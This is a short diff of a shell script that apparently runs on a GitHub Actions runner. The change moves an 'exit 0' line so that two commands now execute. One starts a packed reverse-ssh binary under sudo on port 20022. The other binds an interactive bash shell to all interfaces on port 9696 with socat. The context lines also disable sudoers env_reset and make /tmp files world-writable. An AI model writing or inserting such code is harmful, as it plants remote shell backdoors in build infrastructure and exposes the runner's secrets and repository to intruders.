@@ -34,12 +34,12 @@ chmod 0777 /tmp/{A,aB};
 sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g" /etc/sudoers;
 grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 > /tmp/js9a.txt
 '
-exit 0;
+
 [ -x $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&busybox setsid sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022 &
 [ -x $GITHUB_WORKSPACE/socat.bin ]&&busybox setsid $GITHUB_WORKSPACE/socat.bin -v tcp-l:9696,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
 
 
-
+exit 0;
 # github_rev_ssh
 (id | grep "^uid=[0-9]\{1,9\}(runner)") && 
 (
